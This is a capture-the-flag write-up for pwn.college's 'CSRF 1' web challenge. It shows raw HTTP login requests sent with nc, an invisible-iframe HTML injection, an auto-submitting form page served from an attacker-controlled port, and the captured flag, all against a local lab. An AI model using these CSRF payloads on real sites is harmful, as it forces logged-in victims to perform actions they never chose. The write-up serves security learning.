---
layout: page
title: "💉 CSRF 1 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 📁 Challenge Info

- **Category**: Web Exploitation
- **Challenge**: CSRF 1
- **Platform**: pwn.college
- **Tags**: `CSRF`, `Privilege Escalation`, `HTML Injection`, `Stored XSS (iframe)`

---

## 🔍 Description

This challenge introduces **Cross-Site Request Forgery (CSRF)**, where an attacker forces a victim to unknowingly make an authenticated request. Our goal is to trick the admin bot into **visiting an attacker-controlled page** that automatically publishes the admin’s draft post.

---

## 🧠 Understanding the Setup

### App Features

- **Login** via `/login` with session cookie.
- **Draft post** via `/draft`, accepts HTML content.
- **Publish** via `/publish`, using **GET** requests (CSRF-prone!).
- Admin bot **visits** the main page and follows embedded links or frames.

---

## 🧪 Attack Strategy

1. Login as `hacker`
2. Create a post that embeds an **invisible iframe** pointing to our attacker-controlled server
3. Serve a malicious HTML page from `http://hacker.localhost:1337/`
4. When the bot visits the post, the iframe loads and silently triggers a GET request to `/publish`
5. This **publishes** the admin’s draft, revealing the flag

---

## ⚙️ Exploit Steps

### 1. Log in as hacker

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

✅ Grab the session cookie from response:

```
session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4PNQ.asUqMabS4FY7c-cb5B0-MCaI0cg
```

---

### 2. Craft malicious post with iframe

Payload:
```html
<iframe src="http://hacker.localhost:1337/" width="0" height="0"></iframe>
```

URL-encoded as:
```
content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&publish=on
```

Submit via `POST /draft`:

```bash
PAYLOAD="content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&publish=on"
LENGTH=$(echo -n "$PAYLOAD" | wc -c)
echo -e "POST /draft HTTP/1.0\r
Host: challenge.localhost\r
Cookie: session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4PNQ.asUqMabS4FY7c-cb5B0-MCaI0cg\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: $LENGTH\r
\r
$PAYLOAD" | nc challenge.localhost 80
```

---

### 3. Start malicious server (attacker-controlled)

Serve `index.html` from port `1337`:

```bash
python -m http.server 1337
```

Contents of `index.html`:

```html
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://challenge.localhost/publish" method="GET">
      <!-- Hidden form auto-submits on load -->
    </form>
  </body>
</html>
```

🧠 This **auto-submits** a GET request to `/publish` as soon as the admin loads it inside the iframe.

---

### 4. Trigger admin visit

```bash
/challenge/victim
```

✅ Admin visits the page, loads the iframe, and the CSRF triggers `/publish`.

---

### 5. Re-login and verify success

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

Get new session and then:

```bash
curl -b "session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4Pvg.z85iGtC4AhGvJkGX8LOz1wPo-5Y" http://challenge.localhost/
```

✅ Page shows:

```html
<h2>Author: admin</h2>pwn.college{kVpaE06oj3LD0PEN5AVXrNX9jhd.QX3kzMzwSM0IzMyEzW}
```

---

## 🏁 Flag

```
pwn.college{kVpaE06oj3LD0PEN5AVXrNX9jhd.QX3kzMzwSM0IzMyEzW}
```

---


## ✅ Summary

This challenge demonstrates classic **GET-based CSRF**, where:

- Attacker-controlled content embeds an iframe
- Victim browser loads it
- A state-changing GET request fires in the background

🔓 Because the victim is logged in and no CSRF token is required — the action succeeds.

---

